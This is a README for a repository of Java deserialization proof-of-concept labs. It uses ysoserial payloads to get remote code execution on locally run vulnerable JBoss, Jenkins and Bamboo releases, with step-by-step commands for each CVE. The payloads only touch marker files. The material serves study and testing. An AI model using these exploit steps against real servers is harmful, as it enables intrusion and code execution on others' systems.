# Java Deserialization Of Untrusted Data
Here there are practical examples of the - deserialization of untrusted data - vulnerability.

These pocs use the [ysoserial](https://github.com/frohoff/ysoserial/) tool to generate exploits.

<a href="https://www.buymeacoffee.com/edoardovignati" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee"  width="20%"></a>

# Pocs

Minimal Example
---------------------------------
- Use OpenJDK 1.8
```
cd MinimalExample
java -jar ../ysoserial-master-v0.0.5-gb617b7b-16.jar CommonsCollections6 "/tmp/exploit.sh">payload.ser 
cp ./exploit.sh /tmp
chmod +x /tmp/exploit.sh
javac Employee.java
javac DeSerializingObject.java
java -classpath .:apache-collections-commons-collections-3.1.jar DeSerializingObject 
```
- You will find a file "pwned" in /tmp. This means that the attack has been completed correctly with a RCE.

JBOSS (CVE-2016-7065)
---------------------------------

- Use OpenJDK 1.8
- Download a vulnerable version of Jboss (in this case you can find the v5.1.0) 
- Run jboss: ```java -jar ./JBoss/jboss-5.1.0.GA/bin/run.jar```
- Download and open Burp: setup your proxy on localhost:9090
- In your browser start proxy on localhost:9090
- Generate the payload with ysoserial: ```java -jar ysoserial.jar CommonsCollections5 "touch /tmp/JbossVulnerable.txt" > JbossPayload.ser``` or use the payload inside the folder JBoss
- Open localhost:8080/invoker/JMXInvokerServlet
- In Burp "paste from file" and choose JbossPayload.ser
- Checkout in /tmp folder the execution of "touch /tmp/JbossVulnerable.txt"

https://www.vulmon.com/vulnerabilitydetails?qid=CVE-2016-7065&scoretype=cvssv2


Jenkins (CVE-2015-8103)
---------------------------------
- Use OpenJDK 1.8
- Download a vulnerable version of Jenkins (in this case you can find the v1.649)
```
java -jar ./jenkins-war-1.649.war
java -cp ysoserial-master-v0.0.5-gb617b7b-16.jar ysoserial.exploit.JenkinsListener http://localhost:8080 CommonsCollections5 "touch /tmp/JenkinsVulnerable.txt"
```

https://www.vulmon.com/vulnerabilitydetails?qid=CVE-2015-8103&scoretype=cvssv2


Bamboo (CVE-2015-6576)
---------------------------------

- Use openJDK 1.7
- Download and install vulnerable version of Bamboo (v5.4.3 in this case) 
- Create folder /home/user/bamboohome/
- Add/update the property /Bamboo/atlassian-bamboo-5.4.3/atlassian-bamboo/WEB-INF/classes/bamboo-init.properties with
	bamboo.home=/home/user/bamboohome
- Get fingerprint -> localhost:8085/agentServer/GetFingerprint.action?agentType=elastic
- Generate payload with ysoserial
- Open localhost:8085/agentServer/message?fingerprint<copied fingerprint> and "copy from file" in burp
```java -jar ysoserial.jar CommonsCollections4 "touch /tmp/BambooVulnerable.txt" > BambooPayload.ser ```
  or use the payload inside the folder JBoss

https://www.vulmon.com/vulnerabilitydetails?qid=CVE-2015-6576&scoretype=cvssv2
	

# Ysoserial stacktraces

Find them in the /Ysoserial-stacktraces directory

# References and readings

- https://www.edoardovignati.it/how-to-install-old-versions-of-java-jdk/
- https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478

# Defenses
- https://link.springer.com/chapter/10.1007/978-3-030-00470-5_21


